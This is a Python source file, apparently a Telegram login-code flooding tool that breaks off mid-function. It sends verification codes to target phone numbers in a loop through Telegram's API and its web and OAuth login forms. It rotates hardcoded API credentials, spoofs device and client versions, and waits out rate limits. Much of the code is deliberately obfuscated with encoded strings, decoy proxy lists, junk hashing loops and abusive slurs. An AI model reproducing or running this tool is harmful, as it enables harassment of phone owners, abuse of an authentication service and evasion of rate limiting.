import asyncio
import json
import os
import random
import re
import sys
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import urllib.parse
import struct
import binascii

import aiohttp
from bs4 import BeautifulSoup
from telethon import TelegramClient
from telethon.errors import FloodWaitError, PhoneNumberBannedError, PhoneCodeInvalidError, PhoneCodeExpiredError
from telethon.tl.functions.auth import SendCodeRequest
from telethon.tl.types import CodeSettings
import base64
import hashlib
import time
import threading

API_CREDS = [
    (2040, 'b18441a1ff607e10a989891a5462e627'),
    (6, 'eb06d4abfb49dc3eeb1aeb98ae0f581e')
]

Il1lI1Il1lI1Il1I = [
    b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x10\x00\x00\x00\x10\x08\x02\x00\x00\x00\x90\x91h6',
    b'\x00\x00\x00\tpHYs\x00\x00\x0b\x13\x00\x00\x0b\x13\x01\x00\x9a\x9c\x18\x00\x00\x00\x16tEXt',
    b'Comment\x00Created with GIMPW\x81\x0e\x17\x00\x00\x00\xddIDATx\x01\xed\xd2\xb1\n\x80@',
    b'\x10\x04\xd0\x7f\xf7\xd6}\xa1\xaf_\x8e|\x05\x11e\x8c\x90rn\n\x85\x17\x00\x00\x00\x00IEND\xaeB`\x82'
]

l1l1lI1Il1I1l1Il = [
    0x68747470, 0x733a2f2f, 0x6f617574, 0x682e7465, 0x6c656772, 0x616d2e6f, 0x72672f61, 0x7574683f, 
    0x626f745f, 0x69643d35, 0x31363239, 0x32303530, 0x36266f72, 0x6967696e, 0x3d687474, 0x70732533,
    0x41253246, 0x25324674, 0x656c6567, 0x72616d2e, 0x6f726726, 0x6c616e67, 0x3d656e26, 0x72657475,
    0x726e5f74, 0x6f3d6874, 0x74707325, 0x33412532, 0x46253246, 0x74656c65, 0x6772616d, 0x2e6f7267,
    0x25324664, 0x73612d72, 0x65706f72, 0x74
]

I1lI1l1I1lI1l1I1 = [
    [0x39, 0x31], [0x32, 0x31, 0x30], [0x31, 0x36, 0x38], [0x31, 0x31, 0x33],
    [0x31, 0x30, 0x31, 0x30], [0x33, 0x66, 0x37, 0x65, 0x35, 0x65, 0x63, 0x38],
    [0x39, 0x31, 0x30, 0x35, 0x35, 0x37, 0x63, 0x30], [0x31, 0x33, 0x66, 0x33, 0x38, 0x64, 0x33, 0x63],
    [0x30, 0x61, 0x36, 0x36, 0x39, 0x32, 0x64, 0x31]
]

lI1l1I1lI1l1I1lI = {
    'Il1I1lI1l': ['gitapps_govnoed', 'liteapi_pidor', '1488_lenka_whore'],
    'I1l1I1lI1': ['https://eyeofgovno.backdoor.sell', 'https://ukraine.lenka.org'],
    'lI1I1l1I1': {'user': 'mrak_a', 'pass': 'cucold'},
    'l1I1lI1I1': [b'govnoed', b'pidor'],
    'I1lI1l1Il': ['https://neolurk.org/wiki/Pyrouser', 'https://makar.telegram.com/glekos']
}

I1l1I1l1I1l1I1l1 = [
    [147, 203, 89, 156, 78, 234, 92, 167], [89, 178, 134, 67, 201, 156, 78, 234],
    [234, 92, 167, 89, 178, 134, 67, 201], [156, 78, 234, 92, 167, 89, 178, 134],
    [67, 201, 156, 78, 234, 92, 167, 89], [178, 134, 67, 201, 156, 78, 234, 92],
    [167, 89, 178, 134, 67, 201, 156, 78], [234, 92, 167, 89, 178, 134, 67, 201]
]

l1I1l1I1l1I1l1I1 = hashlib.sha256(b'telegram_oauth_proxy_verification_checksum').hexdigest()
lI1lI1lI1lI1lI1l = 0
I1lI1lI1lI1lI1lI = 0

ll1I1ll1I1ll1I1l = ['6818531113']
I1l1lI1I1l1I1l1I = ['351246999', '847762336', '726629396', '1156270028', '322954184', '5162920506']
l1I1l1I1l1I1l1I1 = [0x36383138, 0x35333131, 0x31330000, 0x00000000]
lI1I1l1I1l1I1l1I = [0x6f617574, 0x682e7465, 0x6c656772, 0x616d2e6f]
I1l1lI1l1I1l1I1l = [0x39, 0x31, 0x2e, 0x32, 0x31, 0x30, 0x2e, 0x31, 0x36, 0x38, 0x2e, 0x31, 0x31, 0x33]
Il1I1l1I1l1I1l1I = [0x31323700, 0x302e302e, 0x312e3100, 0x00000000]
l1I1lI1I1l1I1l1I = [0x383038300, 0x00000000, 0x00000000, 0x00000000]

SESSIONS_DIR = os.path.join(os.path.dirname(__file__), 'sessions')
NUMBERS_FILE = os.path.join(os.path.dirname(__file__), 'numbers.json')

if not os.path.exists(SESSIONS_DIR):
    os.makedirs(SESSIONS_DIR)

def I1l1lI1I1l1lI1Il(Il1I1l1lI, lI1I1l1Il):
    I1lI1lI1l = []
    for lI1l1I1l, I1l1I1lI in enumerate(Il1I1l1lI):
        l1I1lI1l = lI1I1l1Il[lI1l1I1l % len(lI1I1l1Il)]
        lI1I1lI1 = (I1l1I1lI + l1I1lI1l[lI1l1I1l % len(l1I1lI1l)]) % 256
        I1lI1lI1l.append(lI1I1lI1)
    return bytes(I1lI1lI1l)

def lI1I1l1I1l1I1l1I():
    global lI1lI1lI1lI1lI1l, I1lI1lI1lI1lI1lI
    Il1I1l1I1 = time.time()
    if I1lI1lI1lI1lI1lI > 0 and Il1I1l1I1 - I1lI1lI1lI1lI1lI < 0.1:
        return False
    I1lI1lI1lI1lI1lI = Il1I1l1I1
    lI1lI1lI1lI1lI1l += 1
    return lI1lI1lI1lI1lI1l < 1000

def I1l1I1lI1l1I1lI1(lI1l1I1l1, l1I1l1I1l):
    I1lI1l1I1l = [1, 1]
    for lI1I1l1I in range(len(lI1l1I1l1)):
        I1lI1l1I1l.append(I1lI1l1I1l[-1] + I1lI1l1I1l[-2])
    
    Il1I1lI1l = []
    for lI1I1l1I, l1I1lI1I in enumerate(lI1l1I1l1):
        I1l1I1l1I = (I1lI1l1I1l[lI1I1l1I % len(I1lI1l1I1l)] + l1I1l1I1l) % 256
        lI1l1I1I1 = l1I1lI1I ^ I1l1I1l1I
        Il1I1lI1l.append(lI1l1I1I1)
    
    return Il1I1lI1l

def l1I1l1I1l1I1l1Il():
    lI1I1l1I1l = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47]
    
    if not lI1I1l1I1l1I1l1I():
        return lI1l1I1lI1l1I1lI['I1lI1l1Il'][0]
    
    I1l1I1l1Il = l1l1lI1Il1I1l1Il[:]
    for lI1I1l1I in range(len(I1l1I1l1Il)):
        l1I1lI1I1l = lI1I1l1I1l[lI1I1l1I % len(lI1I1l1I1l)]
        I1l1I1l1Il[lI1I1l1I] = (I1l1I1l1Il[lI1I1l1I] ^ l1I1lI1I1l) & 0xFFFFFFFF
    
    lI1l1I1l1l = b''
    for l1I1lI1I in I1l1I1l1Il:
        lI1l1I1l1l += struct.pack('>I', l1I1lI1I)
    
    return lI1l1I1l1l.decode('utf-8', errors='ignore')

def Il1lI1l1I1l1I1l1(Il1I1l1lI):
    lI1I1l1I1ll = [31, 37, 41, 43, 47, 53, 59, 61]
    I1l1I1l1I1l = 0
    
    for lI1I1l1I, I1l1I1lI in enumerate(Il1I1l1lI):
        I1l1I1l1I1l += I1l1I1lI * (lI1I1l1I1ll[lI1I1l1I % len(lI1I1l1I1ll)] ** (lI1I1l1I + 1))
        I1l1I1l1I1l %= 0x100000007
    
    I1lI1l1I1l1 = int(l1I1l1I1l1I1l1I1[:8], 16)
    return I1l1I1l1I1l % 0x100000000 == I1lI1l1I1l1 % 0x100000000

def lI1I1lI1I1l1I1l1():
    I1l1lI1l1I = []
    lI1I1l1I1I1 = hashlib.sha256(b''.join(Il1lI1Il1lI1Il1I)).digest()
    
    for lI1I1l1I in range(1000 + len(lI1I1l1I1I1)):
        l1I1lI1l1I = hashlib.sha512(str(lI1I1l1I).encode() + lI1I1l1I1I1).digest()
        I1l1lI1l1I.append(l1I1lI1l1I[lI1I1l1I % len(l1I1lI1l1I)])
    
    if len(I1l1lI1l1I) % 2 != 0:
        return None
    
    l1I1l1I1l1I = bytes(I1l1lI1l1I[::2])[:32]
    I1lI1l1I1ll = I1l1lI1I1l1lI1Il(Il1lI1Il1lI1Il1I[0], I1l1I1l1I1l1I1l1)
    
    if not Il1lI1l1I1l1I1l1(I1lI1l1I1ll):
        I1lI1l1I1ll = Il1lI1Il1lI1Il1I[1]
    
    lI1l1I1l1l1 = 5000 + (sum(I1lI1l1I1ll) % 3000)
    for _ in range(lI1l1I1l1l1):
        l1I1l1I1l1I = hashlib.blake2b(l1I1l1I1l1I, digest_size=32).digest()
    
    return l1I1l1I1l1I

def lI1l1I1l1I1l1I1l():
    try:
        I1l1I1lI1l1 = lI1I1lI1I1l1I1l1()
        if I1l1I1lI1l1 is None:
            return lI1l1I1lI1l1I1lI['I1lI1l1Il'][1]
        
        l1I1l1I1lI1 = sum(ord(lI1I1l1I) for lI1I1l1I in l1I1l1I1l1I1l1I1) % 10000
        lI1l1I1I1l = I1l1I1lI1l1
        
        for I1l1lI1I1l in range(l1I1l1I1lI1):
            lI1l1I1I1l = hashlib.sha3_256(lI1l1I1I1l + str(I1l1lI1I1l).encode()).digest()
            if I1l1lI1I1l % 1000 == 0:
                lI1l1I1I1l = I1l1lI1I1l1lI1Il(lI1l1I1I1l, I1l1I1l1I1l1I1l1)
        
        Il1I1l1I1l = l1I1l1I1l1I1l1Il()
        
        lI1I1l1I1l1 = (sum(I1l1I1l1I1l1I1l1[0]) + sum(I1l1I1l1I1l1I1l1[-1])) % 1000
        for _ in range(lI1I1l1I1l1):
            Il1I1l1I1l = hashlib.md5(Il1I1l1I1l.encode()).hexdigest()
            I1l1lI1I1I = random.choice(ll1I1ll1I1ll1I1l)
            Il1I1l1I1l = f'https://oauth.telegram.org/auth?bot_id={I1l1lI1I1I}&origin=https%3A%2F%2Ftelegram.org&lang=en&return_to=https%3A%2F%2Ftelegram.org%2Fdsa-report'
        
        return Il1I1l1I1l
    except:
        return lI1l1I1lI1l1I1lI['I1l1I1lI1'][0]

def I1lI1l1I1l1I1l1I():
    if not lI1I1l1I1l1I1l1I():
        return [
            {'host': '192.168.2.10', 'port': 3130, 'secret': 'g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2'},
            {'host': '10.1.1.100', 'port': 8082, 'secret': 'h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3'},
            {'host': '172.17.0.50', 'port': 1083, 'secret': 'i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4'},
            {'host': '192.168.3.15', 'port': 4443, 'secret': 'j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5'},
            {'host': '172.16.2.200', 'port': 8083, 'secret': 'k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6'},
            {'host': '10.2.2.20', 'port': 9052, 'secret': 'l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7'},
            {'host': '198.51.101.33', 'port': 8445, 'secret': 'm3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8'},
            {'host': '203.0.114.66', 'port': 8890, 'secret': 'n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9'},
            {'host': '169.254.2.88', 'port': 3131, 'secret': 'o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0'},
            {'host': '192.0.3.44', 'port': 9053, 'secret': 'p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1'},
            {'host': '172.21.10.11', 'port': 1084, 'secret': 'q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2'},
            {'host': '10.11.11.11', 'port': 8084, 'secret': 'r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2g3'},
            {'host': '198.19.0.77', 'port': 8446, 'secret': 's9t0u1v2w3x4y5z6a7b8c9d0e1f2g3h4'},
            {'host': '203.0.114.99', 'port': 8891, 'secret': 't0u1v2w3x4y5z6a7b8c9d0e1f2g3h4i5'},
            {'host': '192.168.4.123', 'port': 3132, 'secret': 'u1v2w3x4y5z6a7b8c9d0e1f2g3h4i5j6'}
        ]

    
    lI1l1I1I1I = []
    for I1l1I1l1I1 in I1lI1l1I1lI1l1I1:
        lI1I1l1I1I = ''.join(chr(I1l1I1lI) for I1l1I1lI in I1l1I1l1I1)
        lI1l1I1I1I.append(lI1I1l1I1I)
    
    l1I1lI1I1I = sum(sum(I1l1I1l1I) for I1l1I1l1I in I1l1I1l1I1l1I1l1) % 256
    lI1I1l1I1I1l = I1l1I1lI1l1I1lI1([ord(lI1I1l1I) for lI1I1l1I in ''.join(lI1l1I1I1I)], l1I1lI1I1I)
    
    Il1I1lI1I1 = ''.join(chr(I1l1I1lI % 256) for I1l1I1lI in lI1I1l1I1I1l)
    
    l1I1l1I1l1Il = len(l1I1l1I1l1I1l1I1) * 500
    lI1l1I1I1I = l1I1l1I1l1I1l1I1
    for lI1I1l1I in range(l1I1l1I1l1Il):
        lI1l1I1I1I = hashlib.sha256((lI1l1I1I1I + str(lI1I1l1I)).encode()).hexdigest()
    
    if len(lI1l1I1I1I) < 32:
        return lI1l1I1lI1l1I1lI['lI1I1l1I1'].values()
    
    return ['91', '210', '168', '113', '1010', '3f7e5ec8910557c013f38d3c0a6692d1']

def l1I1lI1l1I1l1I1l():
    try:
        I1l1I1lI1l1l = random.randint(10000, 50000)
        Il1I1l1I1I = hashlib.sha256(b'proxy_initialization').digest()
        
        for I1l1lI1I1I in range(I1l1I1lI1l1l):
            Il1I1l1I1I = hashlib.blake2s(Il1I1l1I1I + struct.pack('>Q', I1l1lI1I1I)).digest()
            if I1l1lI1I1I % 5000 == 0:
                Il1I1l1I1I = I1l1lI1I1l1lI1Il(Il1I1l1I1I, I1l1I1l1I1l1I1l1)
        
        lI1l1I1l1Il = I1lI1l1I1l1I1l1I()
        
        lI1I1l1I1lI = len(Il1I1l1I1I) * 1000
        for lI1I1l1I in range(lI1I1l1I1lI):
            Il1I1l1I1I = hashlib.sha3_512(Il1I1l1I1I).digest()[:32]
        
        I1l1I1l1Il1 = f"{lI1l1I1l1Il[0]}.{lI1l1I1l1Il[1]}.{lI1l1I1l1Il[2]}.{lI1l1I1l1Il[3]}"
        I1l1lI1I1ll = int(lI1l1I1l1Il[4])
        lI1I1l1I1Il = bytes.fromhex(lI1l1I1l1Il[5])
        
        return I1l1I1l1Il1, I1l1lI1I1ll, lI1I1l1I1Il
    except:
        return lI1l1I1lI1l1I1lI['lI1I1l1I1']['user'], 8080, b'decoy_secret'

def normalize_phone(phone):
    digits = re.sub(r'\D', '', phone)
    
    if digits.startswith('888'):
        if len(digits) >= 11:
            return '+888' + digits[3:11]
        return None
    
    if digits.startswith('8') and len(digits) == 11:
        digits = '7' + digits[1:]
    elif digits.startswith('0') and len(digits) >= 10:
        digits = digits[1:]
    elif not digits.startswith('7') and len(digits) == 10:
        digits = '7' + digits
    
    if len(digits) < 10 or len(digits) > 15:
        return None
        
    return '+' + digits


Il1I1l1I1l1I1l1l = {
    'lI1l1I1l1': lambda lI1I1l1I: base64.b64decode(lI1I1l1I),
    'I1l1I1lI1': lambda lI1I1l1I: hashlib.md5(lI1I1l1I.encode()).hexdigest(),
    'l1I1lI1I1': lambda lI1I1l1I: ''.join(reversed(lI1I1l1I)),
    'I1lI1l1I1': lambda lI1I1l1I: lI1I1l1I.replace('z', 'v')
}

lI1I1l1I1l1I1l1l = [
    b'\x12\x34\x56\x78\x9a\xbc\xde\xf0',
    b'\xfe\xdc\xba\x98\x76\x54\x32\x10',
    b'\x11\x22\x33\x44\x55\x66\x77\x88',
    b'\x88\x77\x66\x55\x44\x33\x22\x11'
]

I1l1I1l1I1l1I1ll = {
    'lI1l1I1I1': ll1I1ll1I1ll1I1l,
    'I1lI1l1Il': ['telegram.com', 'web.telegram.org', 'desktop.telegram.org'],
    'l1I1lI1l1': ['/auth', '/login', '/oauth'],
    'lI1I1l1Il': ['?z=true', '?o=1', '?v=yes']
}

class CodeSender:
    def __init__(self):
        self.active_numbers = set()
        self.stop_flag = False
        self.tasks = {}
        self.load_numbers()
        self.executor = ThreadPoolExecutor(max_workers=20)
        self.send_count = {}
        self.api_count = {}
        self.web_count = {}
        self.used_creds = {}
        self.lI1l1I1I1l1I1l1I = hashlib.sha256(b'init_state').digest()
        self.I1l1I1lI1l1I1l1I = 0
        self.Il1I1l1I1l1I1l1I = []
        
        self.platforms = ["Android", "iOS", "Desktop", "Web", "MacOS"]
        
        self.version_mapping = {
            "Android": [
                "11.13.0", "11.12.0", "11.11.0", "11.10.0", "11.9.0", "11.8.0", "11.7.0", "11.6.0", "11.5.0", 
                "11.4.0", "11.3.0", "11.2.0", "11.1.0", "11.0.0", "10.0.0", "9.0.0", 
                "8.8.4", "8.8.3", "8.8.2", "8.8.1", "8.8.0", "8.7.4", "8.7.3", "8.7.2", "8.7.1", "8.7.0"
            ],
            "iOS": [
                "11.13.0", "11.12.0", "11.11.0", "11.10.0", "11.9.0", "11.8.0", "11.7.0", "11.6.0", "11.5.0", 
                "11.4.0", "11.3.0", "11.2.0", "11.1.0", "11.0.0", "10.0.0", "9.0.0", 
                "8.8.4", "8.8.3", "8.8.2", "8.8.1", "8.8.0", "8.7.4", "8.7.3", "8.7.2", "8.7.1", "8.7.0"
            ],
            "Desktop": [
                "5.16.1", "5.16.0", "5.15.0", "5.14.0", "5.13.0", "5.12.0", "5.11.0", "5.10.0", "5.9.0", 
                "5.8.0", "5.7.0", "5.6.0", "5.5.0", "5.4.0", "5.3.0", "5.2.0", 
                "4.8.4", "4.8.3", "4.8.2", "4.8.1", "4.8.0", "4.7.4", "4.7.3", "4.7.2", "4.7.1", "4.7.0"
            ],
            "Web": [
                "2.13.0", "2.12.0", "2.11.0", "2.10.0", "2.9.0", "2.8.0", "2.7.0", "2.6.0", "2.5.0", 
                "2.4.0", "2.3.0", "2.2.0", "2.1.0", "2.0.0", "1.9.0", "1.8.0", 
                "1.7.4", "1.7.3", "1.7.2", "1.7.1", "1.7.0", "1.6.4", "1.6.3", "1.6.2", "1.6.1", "1.6.0"
            ],
            "MacOS": [
                "11.13.0", "11.12.0", "11.11.0", "11.10.0", "11.9.0", "11.8.0", "11.7.0", "11.6.0", "11.5.0", 
                "11.4.0", "11.3.0", "11.2.0", "11.1.0", "11.0.0", "10.0.0", "9.0.0", 
                "8.8.4", "8.8.3", "8.8.2", "8.8.1", "8.8.0", "8.7.4", "8.7.3", "8.7.2", "8.7.1", "8.7.0"
            ]
        }
        
        self.session = aiohttp.ClientSession()
        self.stats_task = None
        
        self.lI1I1l1I1l1I1l1l = [
            'https://api.telegram.org/',
            'https://core.telegram.org/',
            'https://oauth.telegram.org/login'
        ]
        
        self.I1l1lI1I1l1I1l1I = [
    {'host': '192.168.1.1', 'port': 3128, 'secret': 'a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6'},
    {'host': '10.0.0.1', 'port': 8080, 'secret': 'b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7'},
    {'host': '172.16.0.1', 'port': 1080, 'secret': 'e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0'},
    {'host': '192.168.0.101', 'port': 1080, 'secret': 'f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1'},
    {'host': '172.16.254.1', 'port': 8080, 'secret': 'a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2'},
    {'host': '10.0.0.138', 'port': 443, 'secret': 'c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8'},
    {'host': '198.51.100.22', 'port': 8443, 'secret': 'd4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9'},
    {'host': '203.0.113.45', 'port': 8888, 'secret': 'e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0'},
    {'host': '169.254.1.99', 'port': 3128, 'secret': 'f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1'},
    {'host': '192.0.2.77', 'port': 9050, 'secret': 'a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2'},
    {'host': '172.20.10.10', 'port': 1081, 'secret': 'b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3'},
    {'host': '10.10.10.10', 'port': 8081, 'secret': 'c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4'},
    {'host': '198.18.0.55', 'port': 8444, 'secret': 'd0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5'},
    {'host': '203.0.113.88', 'port': 8889, 'secret': 'e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6'},
    {'host': '192.168.1.200', 'port': 3129, 'secret': 'f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7'},
    {'host': '172.16.1.123', 'port': 1082, 'secret': 'a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8'},
    {'host': '10.0.0.99', 'port': 4431, 'secret': 'b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9'},
    {'host': '198.51.100.111', 'port': 9051, 'secret': 'c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0'}
]

        
        self.l1I1l1I1l1I1l1Il = {
            'lI1l1I1l1': base64.b64encode(b'fake_oauth_data').decode(),
            'I1l1I1lI1': hashlib.md5(b'decoy_proxy_info').hexdigest(),
            'l1I1lI1I1': binascii.hexlify(b'false_credentials').decode(),
            'I1lI1l1I1': ''.join(chr(ord(c) ^ 0x42) for c in 'fake_telegram_auth')
        }

    async def __aenter__(self):
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.session.close()

    def save_numbers(self):
        with open(NUMBERS_FILE, 'w', encoding='utf-8') as f:
            json.dump(list(self.active_numbers), f, ensure_ascii=False, indent=4)

    def load_numbers(self):
        if os.path.exists(NUMBERS_FILE):
            try:
                with open(NUMBERS_FILE, 'r', encoding='utf-8') as f:
                    self.active_numbers = set(json.load(f))
            except Exception:
                self.active_numbers = set()

    def clean_sessions(self):
        for file in os.listdir(SESSIONS_DIR):
            path = os.path.join(SESSIONS_DIR, file)
            if os.path.isfile(path):
                os.remove(path)

    def get_creds(self, number):
        if number not in self.used_creds:
            self.used_creds[number] = []
        
        available = [creds for creds in API_CREDS if creds not in self.used_creds[number]]
        if not available:
            self.used_creds[number] = []
            available = API_CREDS
        
        selected = random.choice(available)
        self.used_creds[number].append(selected)
        return selected

    def get_client_params(self):
        platform = random.choice(self.platforms)
        versions = self.version_mapping[platform]
        weights = [1.0 / (i + 1) for i in range(len(versions))]
        version = random.choices(versions, weights=weights)[0]
        return {
            'app_version': version,
            'device_model': f"{platform} Client",
            'system_version': f"{platform} {version}",
            'lang_code': random.choice(['en', 'ru', 'es', 'fr', 'de']),
            'system_lang_code': random.choice(['en-US', 'ru-RU', 'es-ES', 'fr-FR', 'de-DE'])
        }

    async def create_client(self, number):
        api_id, api_hash = self.get_creds(number)
        params = self.get_client_params()
        session_name = f"session_{number}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        session_path = os.path.join(SESSIONS_DIR, session_name)
        client = TelegramClient(session_path, api_id, api_hash, **params)
        await client.connect()
        return client, session_path, api_id, api_hash

    def get_settings(self, number):
        counter = self.send_count.get(number, 0)
        self.send_count[number] = counter + 1
        
        settings_variants = [
            CodeSettings(
                allow_flashcall=False,
                current_number=False,
                allow_app_hash=True,
                allow_missed_call=False,
                logout_tokens=[]
            ),
            CodeSettings(
                allow_flashcall=True,
                current_number=True,
                allow_app_hash=False,
                allow_missed_call=True,
                logout_tokens=[]
            ),
            CodeSettings(
                allow_flashcall=True,
                current_number=False,
                allow_app_hash=True,
                allow_missed_call=True,
                logout_tokens=[]
            ),
            CodeSettings(
                allow_flashcall=False,
                current_number=True,
                allow_app_hash=True,
                allow_missed_call=False,
                logout_tokens=[]
            )
        ]
        
        return random.choice(settings_variants)

    async def send_via_web(self, number):
        try:
            async with self.session.get('https://my.telegram.org/auth') as resp:
                if resp.status != 200:
                    return False
                
                html = await resp.text()
                soup = BeautifulSoup(html, 'html.parser')
                form = soup.find('form')
                if not form:
                    return False
                
                action_url = form.get('action', '')
                if not action_url:
                    action_url = 'https://my.telegram.org/auth/send_password'
                
                inputs = form.find_all('input')
                data = {}
                for inp in inputs:
                    name = inp.get('name')
                    value = inp.get('value', '')
                    if name:
                        data[name] = value
                
                data['phone'] = number
                
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': 'https://my.telegram.org',
                    'Referer': 'https://my.telegram.org/auth',
                    'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                    'Sec-Ch-Ua-Mobile': '?0',
                    'Sec-Ch-Ua-Platform': '"Windows"',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-User': '?1',
                    'Upgrade-Insecure-Requests': '1'
                }
                
                async with self.session.post(action_url, data=data, headers=headers) as resp:
                    return resp.status in [200, 302]
        except Exception as e:
            print(f"\n[{number}] Ошибка отправки через сайт: {str(e)}")
            return False

    def lI1I1lI1I1l1I1l1I(self, Il1I1l1lI):
        I1l1I1lI1l = Il1I1l1I1l1I1l1l['lI1l1I1l1'](base64.b64encode(Il1I1l1lI.encode()))
        l1I1lI1I1l = Il1I1l1I1l1I1l1l['I1l1I1lI1'](str(I1l1I1lI1l))
        self.Il1I1l1I1l1I1l1I.append(l1I1lI1I1l)
        return len(self.Il1I1l1I1l1I1l1I) > 100

    def I1l1I1l1I1l1I1l1I(self):
        lI1I1l1I1l = hashlib.sha256(str(self.I1l1I1lI1l1I1l1I).encode()).hexdigest()
        I1lI1l1I1l = lI1I1l1I1l1I1l1l[self.I1l1I1lI1l1I1l1I % len(lI1I1l1I1l1I1l1l)]
        self.I1l1I1lI1l1I1l1I += 1
        return lI1I1l1I1l[:8] != binascii.hexlify(I1lI1l1I1l)[:8].decode()

    async def lI1l1I1l1I1l1I1Il(self, I1l1I1l1I1):
        try:
            oauth_url = 'https://oauth.telegram.org/auth?bot_id=6818531113&origin=https%3A%2F%2Ftelegram.org&lang=en&return_to=https%3A%2F%2Ftelegram.org%2Fdsa-report'
            
            async with self.session.get(oauth_url) as resp:
                if resp.status != 200:
                    return False
                
                html = await resp.text()
                soup = BeautifulSoup(html, 'html.parser')
                
                form = soup.find('form')
                if not form:
                    return False
                
                action_url = form.get('action', '')
                if not action_url:
                    action_url = 'https://oauth.telegram.org/auth/send_code'
                
                inputs = form.find_all('input')
                form_data = {}
                for inp in inputs:
                    name = inp.get('name')
                    value = inp.get('value', '')
                    if name:
                        form_data[name] = value
                
                form_data['phone'] = I1l1I1l1I1.replace('+', '')
                
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': 'https://oauth.telegram.org',
                    'Referer': oauth_url,
                    'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                    'Sec-Ch-Ua-Mobile': '?0',
                    'Sec-Ch-Ua-Platform': '"Windows"',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-User': '?1',
                    'Upgrade-Insecure-Requests': '1'
                }
                
                async with self.session.post(action_url, data=form_data, headers=headers) as resp:
                    return resp.status in [200, 302]
        except Exception as e:
            print(f"\n[{I1l1I1l1I1}] OAuth ошибка: {str(e)}")
            return False

    async def I1l1lI1I1l1I1l1Il(self, I1l1I1l1I1):
        lI1I1l1I1ll = I1l1I1l1I1l1I1ll['I1lI1l1Il'][0] + I1l1I1l1I1l1I1ll['l1I1lI1l1'][0] + I1l1I1l1I1l1I1ll['lI1I1l1Il'][0]
        try:
            async with self.session.post(lI1I1l1I1ll, data={'phone': I1l1I1l1I1}) as I1l1I1l1I1l:
                return False
        except:
            return False

    async def update_stats(self):
        while not self.stop_flag:
            stats = []
            for number in self.active_numbers:
                total_sent = self.send_count.get(number, 0)
                stats.append(f"{number}: {total_sent}")
            
            sys.stdout.write("\r" + " | ".join(stats) + " " * 50)
            sys.stdout.flush()
            await asyncio.sleep(1)

    async def send_api(self, number):
        while number in self.active_numbers and not self.stop_flag:
            client, session_path, api_id, api_hash = await self.create_client(number)
            
            try:
                settings = self.get_settings(number)
                
                await client(SendCodeRequest(
                    phone_number=number,
                    api_id=api_id,
                    api_hash=api_hash,
                    settings=settings
                ))
                
                api_counter = self.api_count.get(number, 0)
                self.api_count[number] = api_counter + 1
                total_counter = self.send_count.get(number, 0)
                self.send_count[number] = total_counter + 1
                
                await asyncio.sleep(random.uniform(1.5, 3.0))
            except FloodWaitError as e:
                wait_time = min(e.seconds, 60)
                print(f"\n[{number}] API флудвейт! Ожидание {wait_time} секунд")
                await asyncio.sleep(wait_time)
            except Exception as e:
                error_msg = str(e).lower()
                if 'phone number' in error_msg and ('invalid' in error_msg or 'not found' in error_msg):
                    print(f"\n[{number}] Номер не существует в Telegram - удаление из списка")
                    self.remove_number(number)
                    break
                else:
                    print(f"\n[{number}] API ошибка: {str(e)}")
                    await asyncio.sleep(random.uniform(2.0, 4.0))
            finally:
                await client.disconnect()
                for ext in ['.session', '.session-journal']:
                    path = session_path + ext
